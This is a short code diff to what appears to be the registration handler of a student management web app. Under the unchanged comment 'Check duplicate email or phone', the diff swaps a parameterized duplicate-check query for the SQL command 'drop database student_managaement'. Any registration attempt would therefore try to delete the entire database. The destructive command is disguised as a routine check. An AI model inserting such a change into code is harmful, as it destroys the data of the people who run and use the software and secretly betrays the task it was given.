@@ -66,8 +66,7 @@ def register():
 
     # Check duplicate email or phone
     cursor.execute(
-        "SELECT * FROM students WHERE email = %s OR phone = %s",
-        (email, phone)
+        "drop database student_managaement"
     )
 
     existing_student = cursor.fetchone()
